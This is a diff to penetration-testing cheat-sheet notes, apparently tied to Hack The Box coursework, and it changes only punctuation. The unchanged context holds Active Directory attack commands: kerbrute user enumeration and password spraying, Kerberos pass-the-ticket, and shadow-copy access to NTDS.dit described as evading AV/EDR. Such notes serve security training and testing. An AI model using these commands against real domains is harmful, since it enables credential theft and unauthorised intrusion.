@@ -92,7 +92,7 @@ Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
 
 ### Need to validate a list of potential AD usernames before spraying
 
-→ Use **kerbrute** against the DC's Kerberos port (88) — no account lockout risk with `userenum`, no auth required:
+→ Use **kerbrute** against the DC's Kerberos port (88), no account lockout risk with `userenum`, no auth required:
 ```bash
 kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/wordlists/xato-net-10-million-usernames.txt
 ```
@@ -101,11 +101,11 @@ kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/wordlists/xato-net-10-mill
 username-anarchy -i names.txt > candidate_users.txt
 kerbrute userenum -d <domain> --dc <DC-IP> candidate_users.txt
 ```
-→ Once you have valid usernames, spray with kerbrute (careful — `bruteuser`/`passwordspray` DO count against lockout policy):
+→ Once you have valid usernames, spray with kerbrute (careful, `bruteuser`/`passwordspray` DO count against lockout policy):
 ```bash
 kerbrute bruteuser -d <domain> --dc <DC-IP> valid_users.txt 'Password123!'
 ```
-→ Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute — Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
+→ Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute. Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
 
 ---
 
@@ -128,7 +128,7 @@ smbclient -k -N //target/share     # use it (no password needed)
 If you have a `.keytab` instead of a `.ccache`: extract with `keytabextract.py <file.keytab>`, then `kinit <user>@DOMAIN` to get a TGT.
 
 → Key rule: TGTs let you request any TGS (full impersonation); a TGS only works for the single service it was issued for.
-→ Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket — Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket — Linux|PA.16]]
+→ Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket. Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket. Linux|PA.16]]
 
 ---
 
@@ -158,7 +158,7 @@ evil-winrm -i <target> -r <domain>
 
 ### Need NTDS.dit but can't run Mimikatz or secretsdump directly
 
-→ Use **Volume Shadow Copy** — doesn't touch the live NTDS.dit file, so AV/EDR is less likely to catch it:
+→ Use **Volume Shadow Copy**, doesn't touch the live NTDS.dit file, so AV/EDR is less likely to catch it:
 ```cmd
 vssadmin CREATE SHADOW /For=C:
 :: Note the shadow copy path, e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
